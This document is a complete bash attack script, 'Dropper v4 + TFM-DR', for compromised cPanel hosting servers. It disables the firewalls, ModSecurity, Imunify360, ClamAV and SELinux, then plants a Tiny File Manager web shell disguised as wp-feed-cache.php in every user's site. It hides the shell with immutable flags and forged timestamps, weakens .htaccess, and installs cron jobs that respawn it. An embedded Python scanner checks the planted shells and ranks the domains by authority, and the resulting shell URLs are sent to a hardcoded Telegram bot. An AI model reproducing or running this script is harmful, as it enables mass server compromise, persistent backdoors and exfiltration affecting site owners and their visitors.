#!/bin/bash
# ============================================================
#  DROPPER v4 + TFM-DR INTEGRATED — FULL ONESHOT
#  Phase 1-8 : deploy + persist
#  Phase 9   : TFM verification + DR scoring
#  Phase 10  : Telegram delivery (raw + verified)
# ============================================================

export PATH="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/local/cpanel/bin:/scripts"

# ════════════════════════════════════════
#  CONFIG
# ════════════════════════════════════════
SOURCE="tinyfilemanager.php"
DISGUISE_NAME="wp-feed-cache.php"
CRON_TAG="sys_health_check_daemon"
GHOST_REF="/etc/passwd"
TS=$(date +%Y%m%d_%H%M%S)
RESULTS="/root/dropper_results_${TS}.txt"
VERIFIED="/root/verified_results_${TS}.txt"
URL_LIST="/root/url_list_${TS}.txt"
PERSIST_DIR="/usr/local/lib/.cache"
WHMAPI1="/usr/local/cpanel/bin/whmapi1"
LSWS_CONF="/usr/local/lsws/conf/httpd_config.conf"

TELEGRAM_TOKEN="9139936651:AAE89fq5uUuDoDsJkllxRZeBgBaVW6X8nKs"
TELEGRAM_CHAT_ID="-1004459048412"

TFM_WORKERS=30
TFM_TIMEOUT=10
TFM_MIN_DR=0

# ════════════════════════════════════════
#  PHASE 1 — PREFLIGHT
# ════════════════════════════════════════
if [ "$(id -u)" -ne 0 ]; then
  echo "[!] must run as root."
  exit 1
fi

if [ ! -f "$SOURCE" ]; then
  echo "[!] source not found: $SOURCE"
  exit 1
fi

# Python 3 check
if ! command -v python3 &>/dev/null; then
  echo "[!] python3 not found — TFM-DR phase will be skipped"
  SKIP_TFM=1
fi

mkdir -p "$PERSIST_DIR"
chmod 700 "$PERSIST_DIR"
> "$RESULTS"

# Telegram connectivity test
tg_test=$(curl -s --max-time 10 \
  "https://api.telegram.org/bot${TELEGRAM_TOKEN}/getMe" 2>/dev/null)
if echo "$tg_test" | grep -q '"ok":true'; then
  echo "✓ Telegram connected"
else
  echo "[!] Telegram unreachable — results will be local only"
fi

echo "── preflight ok ──"

# ════════════════════════════════════════
#  PHASE 2 — SECURITY TEARDOWN
# ════════════════════════════════════════
echo "── disabling security ──"

"$WHMAPI1" configureservice service=cphulkd \
  enabled=0 monitored=0 >/dev/null 2>&1 || true
/scripts/restartsrv_cphulkd stop >/dev/null 2>&1 || true
"$WHMAPI1" set_tweaksetting key=cphulk value=0 >/dev/null 2>&1 || true
echo "✓ cPHulk off"

if command -v csf &>/dev/null; then
  systemctl stop lfd 2>/dev/null || true
  sleep 1
  csf -x 2>/dev/null || true
  echo "✓ CSF/LFD off"
fi

for vendor in OWASP cpanel comodo atomicbasic; do
  "$WHMAPI1" modsec_set_active_vendor \
    vendor_id="$vendor" active=0 >/dev/null 2>&1 || true
done
/usr/local/cpanel/scripts/disable_modsec >/dev/null 2>&1 || true
echo "✓ ModSec off"

if [ -f "$LSWS_CONF" ]; then
  sed -i 's/enableRecaptcha[[:space:]]*1/enableRecaptcha 0/g' \
    "$LSWS_CONF" 2>/dev/null || true
  find /usr/local/lsws/conf/vhosts/ -name "vhconf.conf" 2>/dev/null \
    | xargs -r -I{} sed -i \
        's/enableRecaptcha[[:space:]]*1/enableRecaptcha 0/g' {} \
        2>/dev/null || true
  /usr/local/lsws/bin/lswsctrl restart >/dev/null 2>&1 || true
  echo "✓ LiteSpeed WAF off"
fi

for svc in imunify360-webshield imunify360 imunifyav imunify-antivirus; do
  systemctl stop    "$svc" 2>/dev/null || true
  systemctl disable "$svc" 2>/dev/null || true
done
pkill -9 -f "imunify-agent" 2>/dev/null || true
pkill -9 -f "imunify360"    2>/dev/null || true
echo "✓ Imunify off"

for svc in clamd@scan clamd clamav-daemon; do
  systemctl stop "$svc" 2>/dev/null || true
done
pkill -9 -f clamd 2>/dev/null || true
echo "✓ ClamAV off"

systemctl stop cxs 2>/dev/null || true
pkill -9 -f cxs 2>/dev/null || true
echo "✓ cxs off"

"$WHMAPI1" configureservice service=cpanelfirewalld \
  enabled=0 monitored=0 >/dev/null 2>&1 || true
systemctl stop cpanel-firewall  2>/dev/null || true
systemctl stop cpanelfirewalld  2>/dev/null || true
echo "✓ cPanel firewall off"

if command -v getenforce &>/dev/null && \
   [[ "$(getenforce)" =~ ^[Ee]nforcing$ ]]; then
  setenforce 0
  sed -i \
    's/^[[:space:]]*SELINUX[[:space:]]*=[[:space:]]*[Ee][Nn][Ff][Oo][Rr][Cc][Ii][Nn][Gg]/SELINUX=permissive/' \
    /etc/selinux/config 2>/dev/null || true
  echo "✓ SELinux → permissive"
fi

# ════════════════════════════════════════
#  PHASE 3 — COOLDOWN
# ════════════════════════════════════════
echo "── waiting 10s for services to die ──"
sleep 10

# ════════════════════════════════════════
#  PHASE 4 — PAYLOAD ENCODE
# ════════════════════════════════════════
ENCODED_SOURCE="${PERSIST_DIR}/.svc_payload"

chattr -i "$ENCODED_SOURCE" 2>/dev/null

if ! base64 "$SOURCE" > "$ENCODED_SOURCE" 2>/dev/null; then
  rm -f "$ENCODED_SOURCE" 2>/dev/null
  base64 "$SOURCE" > "$ENCODED_SOURCE" || {
    echo "[!] cannot write payload."
    exit 1
  }
fi

chmod 600 "$ENCODED_SOURCE"
touch -r "$GHOST_REF" "$ENCODED_SOURCE"
chattr +i "$ENCODED_SOURCE" 2>/dev/null
echo "── payload encoded ──"

# ════════════════════════════════════════
#  PHASE 5 — HELPERS
# ════════════════════════════════════════
get_domain() {
  local user="$1"
  local domain=""

  local userdata="/var/cpanel/userdata/${user}/main"
  if [ -f "$userdata" ]; then
    domain=$(grep -m1 'main_domain' "$userdata" \
      | awk '{print $2}' | tr -d "'\"")
  fi

  if [ -z "$domain" ]; then
    domain=$(grep -m1 ": ${user}$" /etc/trueuserdomains 2>/dev/null \
      | cut -d: -f1 | tr -d ' ')
  fi

  if [ -z "$domain" ]; then
    local vhost_file
    vhost_file=$(grep -rl "DocumentRoot.*home/${user}/" \
      /etc/apache2/conf.d/ \
      /etc/httpd/conf.d/ \
      /usr/local/apache/conf/userdata/ 2>/dev/null | head -1)
    if [ -n "$vhost_file" ]; then
      domain=$(grep -m1 "ServerName" "$vhost_file" \
        | awk '{print $2}' | tr -d '"')
    fi
  fi

  echo "$domain"
}

resolve_public_html() {
  local user="$1"
  local p="/home/${user}/public_html"
  realpath "$p" 2>/dev/null \
    || readlink -f "$p" 2>/dev/null \
    || echo "$p"
}

make_url() {
  local user="$1"
  local abs_path="${2%/}"
  local domain="$3"
  local filename="$4"

  local real_home
  real_home=$(resolve_public_html "$user")
  local web_path="${abs_path#${real_home}}"

  if [ -z "$web_path" ]; then
    echo "https://${domain}/${filename}"
  else
    echo "https://${domain}${web_path}/${filename}"
  fi
}

# ════════════════════════════════════════
#  PHASE 6 — DEPLOY FUNCTION
# ════════════════════════════════════════
deploy_to() {
  local target_dir="$1"
  local user="$2"
  local domain="$3"
  local dest="${target_dir}${DISGUISE_NAME}"

  local dir_owner
  dir_owner=$(stat -c '%U' "$target_dir" 2>/dev/null)
  if [ "$dir_owner" != "$user" ] && [ "$dir_owner" != "root" ]; then
    target_dir="/home/${user}/public_html/"
    dest="${target_dir}${DISGUISE_NAME}"
  fi

  chattr -i "$dest" 2>/dev/null
  base64 -d "$ENCODED_SOURCE" > "$dest"
  chown "${user}:${user}" "$dest"
  chmod 444 "$dest"
  touch -r "$GHOST_REF" "$dest"
  chattr +i "$dest" 2>/dev/null

  local htaccess="${target_dir}.htaccess"
  chattr -i "$htaccess" 2>/dev/null

  if ! grep -q "wp-feed-cache" "$htaccess" 2>/dev/null; then
    cat >> "$htaccess" <<'HTEOF'
<Files ~ "\.php$">
  Order allow,deny
  Allow from all
</Files>
<FilesMatch "wp-feed-cache\.php">
  SetHandler application/x-httpd-php
  Order allow,deny
  Allow from all
</FilesMatch>
<IfModule mod_php5.c>
  php_flag engine on
</IfModule>
<IfModule mod_php7.c>
  php_flag engine on
</IfModule>
<IfModule mod_php8.c>
  php_flag engine on
</IfModule>
<IfModule mod_headers.c>
  Header always set X-LiteSpeed-Cache-Control "no-cache"
  Header always set Cache-Control "no-store, no-cache"
</IfModule>
<IfModule mod_rewrite.c>
  RewriteEngine On
  RewriteRule ^wp-feed-cache\.php$ - [L]
</IfModule>
HTEOF
  fi

  touch -r "$GHOST_REF" "$htaccess"
  chattr +i "$htaccess" 2>/dev/null

  if [ -n "$domain" ]; then
    local url
    url=$(make_url "$user" "$target_dir" "$domain" "$DISGUISE_NAME")
    echo "$url" >> "$RESULTS"
    echo "✓  ${user} → ${dest}"
    echo "   ${url}"
  else
    echo "UNRESOLVED:${dest}" >> "$RESULTS"
    echo "✓  ${user} → ${dest} [domain unresolved]"
  fi
}

# ════════════════════════════════════════
#  PHASE 7 — CRON RESPAWN
# ════════════════════════════════════════
install_cron_respawn() {
  local user="$1"
  local target_dir="$2"
  local dest="${target_dir}${DISGUISE_NAME}"
  local respawn_script="${PERSIST_DIR}/.rsp_${user}"

  chattr -i "$respawn_script" 2>/dev/null

  cat > "$respawn_script" <<RESPAWN
#!/bin/bash
DEST="${dest}"
SRC_B64="${ENCODED_SOURCE}"
if [ ! -s "\$DEST" ]; then
  chattr -i "\$DEST" 2>/dev/null
  base64 -d "\$SRC_B64" > "\$DEST"
  chown ${user}:${user} "\$DEST"
  chmod 444 "\$DEST"
  touch -r ${GHOST_REF} "\$DEST"
  chattr +i "\$DEST" 2>/dev/null
fi
RESPAWN

  chmod +x "$respawn_script"
  touch -r "$GHOST_REF" "$respawn_script"
  chattr +i "$respawn_script" 2>/dev/null

  local tag="${CRON_TAG}_${user}"
  local existing
  existing=$(crontab -l 2>/dev/null \
    | grep -v "$tag" \
    | grep -v '^[[:space:]]*$')
  {
    [ -n "$existing" ] && echo "$existing"
    echo "*/5 * * * * bash ${respawn_script} >/dev/null 2>&1 # ${tag}"
  } | crontab - 2>/dev/null
}

# ════════════════════════════════════════
#  PHASE 8 — MAIN DEPLOY LOOP
# ════════════════════════════════════════
echo "── deploying ──"
for dir in /home/*/public_html/; do
  user=$(basename "$(dirname "$dir")")

  deepest=$(find "$dir" -maxdepth 10 -type d \
    ! -path "*/.well-known*"  \
    ! -path "*/cgi-bin*"      \
    ! -path "*/cgi-sys*"      \
    ! -path "*/.git*"         \
    ! -path "*/logs*"         \
    ! -path "*/.cpanel*"      \
    ! -path "*/tmp*"          \
    ! -path "*/cache*"        \
    ! -path "*/error_log*"    \
    2>/dev/null \
    | awk '{ print gsub(/\//,"&") "\t" $0 }' \
    | sort -rn \
    | head -1 \
    | cut -f2-)

  [ -z "$deepest" ] && deepest="$dir"
  [ "${deepest: -1}" != "/" ] && deepest="${deepest}/"

  domain=$(get_domain "$user")
  deploy_to "$deepest" "$user" "$domain"
  install_cron_respawn "$user" "$deepest"
done

TOTAL=$(wc -l < "$RESULTS")
RESOLVED=$(grep -c "^https://" "$RESULTS" 2>/dev/null || echo 0)
echo ""
echo "[deploy done] ${TOTAL} total | ${RESOLVED} resolved"

# ════════════════════════════════════════
#  PHASE 9 — TFM-DR VERIFICATION
# ════════════════════════════════════════
if [ -z "$SKIP_TFM" ] && [ "$RESOLVED" -gt 0 ]; then
  echo "── phase 9: TFM-DR verification ──"

  # Install requests if missing
  python3 -c "import requests" 2>/dev/null || \
    pip3 install requests --break-system-packages -q 2>/dev/null || \
    pip3 install requests -q 2>/dev/null || true

  # Extract clean URL list (https:// only, strip UNRESOLVED lines)
  grep "^https://" "$RESULTS" > "$URL_LIST"

  # Write tfm_dr.py from heredoc
  TFM_SCRIPT="${PERSIST_DIR}/.tfm_dr.py"
  cat > "$TFM_SCRIPT" << 'PYEOF'
#!/usr/bin/env python3
import argparse, re, sys, time
import requests, urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

TFM_SIGNATURES = [
    "Tiny File Manager",
    "fm-login-page",
    "CCP Programmers",
    "Web based File Manager in PHP",
    "tinyfilemanager",
]
DR_API_URL = "https://api.kwscanner.com/v1/public/tools/dr"
DR_HEADERS = {
    "accept": "*/*",
    "content-type": "application/json",
    "origin": "https://kwscanner.com",
    "referer": "https://kwscanner.com/",
    "user-agent": "Mozilla/5.0 (Linux; Android 15; Pixel 9) AppleWebKit/537.36 Chrome/152.0.0.0 Mobile Safari/537.36"
}
DR_BATCH = 25
DR_DELAY = 0.5

GRN="\033[32m"; RED="\033[31m"; YLW="\033[33m"
CYN="\033[36m"; DIM="\033[2m";  BLD="\033[1m"; RST="\033[0m"

def clean_domain(raw):
    d = raw.strip()
    d = re.sub(r'^https?://', '', d)
    d = re.sub(r'^www\.', '', d)
    d = re.sub(r'[/?#].*$', '', d)
    d = re.sub(r':\d+$', '', d)
    return d.lower().strip() or None

def bar(done, total, width=28):
    pct = done / total if total else 0
    filled = int(width * pct)
    return f"[{'█'*filled}{'░'*(width-filled)}] {done}/{total} ({pct*100:.0f}%)"

def check_tfm(url, timeout, retries=2):
    url = url.strip()
    if not url:
        return None
    if not url.startswith("http"):
        url = "http://" + url

    r = {"url": url, "domain": clean_domain(url),
         "code": None, "alive": False,
         "sig_count": 0, "matched": [],
         "latency": None, "status": ""}

    for attempt in range(retries + 1):
        try:
            t0 = time.time()
            resp = requests.get(
                url, timeout=timeout, verify=False,
                allow_redirects=True,
                headers={"User-Agent": "Mozilla/5.0"}
            )
            r["latency"]   = round((time.time() - t0) * 1000)
            r["code"]      = resp.status_code
            r["alive"]     = resp.status_code < 400
            body           = resp.text
            r["matched"]   = [s for s in TFM_SIGNATURES if s.lower() in body.lower()]
            r["sig_count"] = len(r["matched"])
            r["status"]    = "OK" if r["alive"] else f"HTTP {resp.status_code}"
            break
        except requests.exceptions.Timeout:
            r["status"] = "TIMEOUT"
        except requests.exceptions.SSLError:
            r["status"] = "SSL_ERR"
        except requests.exceptions.ConnectionError:
            r["status"] = "CONN_ERR"
        except Exception as e:
            r["status"] = f"ERR:{type(e).__name__}"
        if attempt < retries:
            time.sleep(0.5)
    return r

def check_dr_batch(domains, timeout=30):
    try:
        resp = requests.post(
            DR_API_URL, headers=DR_HEADERS,
            json={"domains": domains}, timeout=timeout
        )
        if resp.status_code == 200:
            data = resp.json()
            return {item["domain"]: item.get("dr", 0)
                    for item in data.get("ratings", [])}
        return {}
    except Exception:
        return {}

def run_dr(domains):
    dr_map = {}
    batches = [domains[i:i+DR_BATCH] for i in range(0, len(domains), DR_BATCH)]
    total   = len(batches)
    print(f"\n{CYN}── phase 2: DR check{RST}  {DIM}{len(domains)} domains → {total} batches{RST}\n")
    for i, batch in enumerate(batches, 1):
        sys.stdout.write(f"\r  {bar(i, total)}  batch {i}/{total}   ")
        sys.stdout.flush()
        result = check_dr_batch(batch)
        dr_map.update(result)
        if i < total:
            time.sleep(DR_DELAY)
    print()
    return dr_map

def display_tfm(r):
    if not r:
        return
    sc = r["sig_count"]
    ms = len(TFM_SIGNATURES)
    if r["alive"] and sc >= 2:
        icon  = f"{GRN}✓{RST}"
        label = f"{GRN}TFM {sc}/{ms}{RST}"
    elif r["alive"] and sc == 1:
        icon  = f"{YLW}~{RST}"
        label = f"{YLW}ALIVE {sc}/{ms} sig{RST}"
    elif r["alive"]:
        icon  = f"{YLW}~{RST}"
        label = f"{YLW}ALIVE no-sig{RST}"
    else:
        icon  = f"{RED}✗{RST}"
        label = f"{RED}{r['status']}{RST}"
    lat  = f"{DIM}{r['latency']}ms{RST}" if r["latency"] else ""
    code = f"{DIM}[{r['code']}]{RST}" if r["code"] else ""
    print(f"  {icon}  {r['url']:<54} {code} {lat:<10} {label}")

def save(path, tfm_results, dr_map, min_dr):
    combined = []
    for r in tfm_results:
        dr = dr_map.get(r["domain"], 0)
        combined.append({**r, "dr": dr})
    combined.sort(key=lambda x: x["dr"], reverse=True)

    alive_tfm   = [c for c in combined if c["alive"] and c["sig_count"] >= 2]
    alive_other = [c for c in combined if c["alive"] and c["sig_count"] < 2]
    dead        = [c for c in combined if not c["alive"]]

    with open(path, "w", encoding="utf-8") as f:
        f.write(f"# tfm-dr results | {time.strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"# total={len(combined)} alive_tfm={len(alive_tfm)} dead={len(dead)}\n")
        f.write("=" * 70 + "\n\n")

        f.write("ALIVE + TFM SIGNATURE (sorted by DR):\n")
        f.write("-" * 70 + "\n")
        for c in alive_tfm:
            if c["dr"] >= min_dr:
                f.write(f"DR:{c['dr']:<4} | {c['domain']:<40} | {c['url']}\n")

        f.write("\nALIVE (no/partial signature):\n")
        f.write("-" * 70 + "\n")
        for c in alive_other:
            f.write(f"DR:{c['dr']:<4} | {c['domain']:<40} | {c['url']}\n")

        f.write("\nDEAD / UNREACHABLE:\n")
        f.write("-" * 70 + "\n")
        for c in dead:
            f.write(f"{'N/A':<6} | {c['domain']:<40} | {c['status']}\n")

    return combined, alive_tfm

def main():
    ap = argparse.ArgumentParser(prog="tfm_dr")
    ap.add_argument("-f",          default="list.txt",    help="input URL list")
    ap.add_argument("-o",          default="results.txt", help="output file")
    ap.add_argument("-w",  type=int, default=30,          help="workers")
    ap.add_argument("-t",  type=int, default=10,          help="timeout")
    ap.add_argument("--skip-dr",   action="store_true")
    ap.add_argument("--tfm-only",  action="store_true")
    ap.add_argument("--min-dr",    type=int, default=0)
    args = ap.parse_args()

    try:
        with open(args.f, encoding="utf-8") as f:
            urls = [l.strip() for l in f
                    if l.strip() and not l.strip().startswith("#")]
    except FileNotFoundError:
        print(f"{RED}✗ file not found: {args.f}{RST}"); sys.exit(1)

    total = len(urls)
    print(f"\n{BLD}── tfm-dr integrated scanner ──{RST}")
    print(f"   {CYN}{total}{RST} URLs  |  {CYN}{args.w}{RST} workers  |  timeout {args.t}s\n")
    print(f"{CYN}── phase 1: TFM verification{RST}\n")

    start       = time.time()
    tfm_results = []
    done        = 0

    with ThreadPoolExecutor(max_workers=args.w) as pool:
        futures = {pool.submit(check_tfm, u, args.t): u for u in urls}
        for fut in as_completed(futures):
            r = fut.result()
            done += 1
            if r:
                tfm_results.append(r)
                display_tfm(r)
            sys.stdout.write(f"\r  {DIM}{bar(done, total)}{RST}")
            sys.stdout.flush()

    print(f"\n\n  phase 1 done in {time.time()-start:.1f}s")

    alive_tfm = [r for r in tfm_results if r["alive"] and r["sig_count"] >= 2]
    alive_all = [r for r in tfm_results if r["alive"]]
    dead      = [r for r in tfm_results if not r["alive"]]

    print(f"\n  {GRN}alive     : {len(alive_all)}{RST}")
    print(f"  {GRN}tfm match : {len(alive_tfm)}{RST}")
    print(f"  {RED}dead      : {len(dead)}{RST}")

    dr_map = {}
    if not args.skip_dr:
        dr_targets = alive_tfm if args.tfm_only else alive_all
        domains    = list({r["domain"] for r in dr_targets if r["domain"]})
        if domains:
            dr_map = run_dr(domains)

    combined, tfm_dr = save(args.o, tfm_results, dr_map, args.min_dr)
    elapsed = time.time() - start

    print(f"\n{BLD}── final results ──{RST}")
    if tfm_dr:
        print(f"\n  {'DR':<6} {'Domain':<40} URL")
        print(f"  {'─'*6} {'─'*40} {'─'*30}")
        for c in tfm_dr[:20]:
            if c["dr"] >= args.min_dr:
                print(f"  {GRN}{c['dr']:<6}{RST} {c['domain']:<40} {DIM}{c['url']}{RST}")
        if len(tfm_dr) > 20:
            print(f"  {DIM}... +{len(tfm_dr)-20} more in {args.o}{RST}")

    print(f"\n  {'─'*50}")
    print(f"  total   : {total}")
    print(f"  {GRN}alive   : {len(alive_all)}{RST}")
    print(f"  {GRN}tfm     : {len(alive_tfm)}{RST}")
    print(f"  {RED}dead    : {len(dead)}{RST}")
    print(f"  time    : {elapsed:.1f}s")
    print(f"  saved → {args.o}\n")

if __name__ == "__main__":
    main()
PYEOF

  chmod +x "$TFM_SCRIPT"

  # Run scanner
  python3 "$TFM_SCRIPT" \
    -f "$URL_LIST" \
    -o "$VERIFIED" \
    -w "$TFM_WORKERS" \
    -t "$TFM_TIMEOUT" \
    --min-dr "$TFM_MIN_DR"

  echo "── TFM-DR done → ${VERIFIED} ──"
else
  echo "── skipping TFM-DR (python3 missing or no resolved URLs) ──"
fi

# ════════════════════════════════════════
#  PHASE 10 — TELEGRAM DELIVERY
# ════════════════════════════════════════
TOTAL=$(wc -l < "$RESULTS")
RESOLVED=$(grep -c "^https://" "$RESULTS" 2>/dev/null || echo 0)
UNRESOLVED=$(grep -c "^UNRESOLVED:" "$RESULTS" 2>/dev/null || echo 0)
HOSTNAME=$(hostname -f 2>/dev/null || hostname)
TIMESTAMP=$(date '+%Y-%m-%d %H:%M:%S')

# Parse verified stats from VERIFIED file header if it exists
if [ -f "$VERIFIED" ]; then
  VRF_TOTAL=$(grep "^# total=" "$VERIFIED" | grep -o 'total=[0-9]*' | cut -d= -f2)
  VRF_TFM=$(grep "^# total=" "$VERIFIED" | grep -o 'alive_tfm=[0-9]*' | cut -d= -f2)
  VRF_DEAD=$(grep "^# total=" "$VERIFIED" | grep -o 'dead=[0-9]*' | cut -d= -f2)
else
  VRF_TOTAL="N/A"; VRF_TFM="N/A"; VRF_DEAD="N/A"
fi

# Top 10 DR shells for summary message
TOP10=""
if [ -f "$VERIFIED" ]; then
  TOP10=$(grep "^DR:" "$VERIFIED" | head -10 \
    | awk -F'|' '{printf "DR:%-4s %s\n", $1, $3}' \
    | sed 's/DR:DR://g' | tr -d ' ' \
    | head -10)
fi

TG_MSG="🖥 <b>Dropper v4 + TFM-DR — Complete</b>
━━━━━━━━━━━━━━━━━━━━
📡 Server: <code>${HOSTNAME}</code>
🕐 Time: <code>${TIMESTAMP}</code>
━━━━━━━━━━━━━━━━━━━━
<b>Deploy</b>
✅ Total dropped : <b>${TOTAL}</b>
🔗 Resolved URLs : <b>${RESOLVED}</b>
⚠️ Unresolved    : <b>${UNRESOLVED}</b>
━━━━━━━━━━━━━━━━━━━━
<b>TFM Verification</b>
🔍 Checked   : <b>${VRF_TOTAL}</b>
✅ TFM alive : <b>${VRF_TFM}</b>
❌ Dead      : <b>${VRF_DEAD}</b>
━━━━━━━━━━━━━━━━━━━━
📄 Two files attached below."

# Send summary message
curl -s --max-time 15 -X POST \
  "https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage" \
  -H "Content-Type: application/json" \
  -d "{
    \"chat_id\": \"${TELEGRAM_CHAT_ID}\",
    \"text\": $(python3 -c "import json,sys; print(json.dumps(sys.stdin.read()))" <<< "$TG_MSG"),
    \"parse_mode\": \"HTML\"
  }" >/dev/null 2>&1

# File 1: raw dropper results
curl -s --max-time 30 \
  -F "chat_id=${TELEGRAM_CHAT_ID}" \
  -F "document=@${RESULTS}" \
  -F "caption=📋 raw drop — ${HOSTNAME} — ${TOTAL} URLs" \
  "https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument" \
  >/dev/null 2>&1 \
  && echo "✓ raw results sent" \
  || echo "[!] raw results send failed"

# File 2: TFM-DR verified results
if [ -f "$VERIFIED" ]; then
  curl -s --max-time 30 \
    -F "chat_id=${TELEGRAM_CHAT_ID}" \
    -F "document=@${VERIFIED}" \
    -F "caption=✅ verified TFM — ${VRF_TFM} confirmed — DR sorted" \
    "https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument" \
    >/dev/null 2>&1 \
    && echo "✓ verified results sent" \
    || echo "[!] verified results send failed"
fi

# Cleanup temp URL list
rm -f "$URL_LIST"

# ════════════════════════════════════════
#  DONE
# ════════════════════════════════════════
echo ""
echo "[done]"
echo "  drop     → ${RESULTS}"
echo "  verified → ${VERIFIED}"
echo ""
cat "$RESULTS"


      
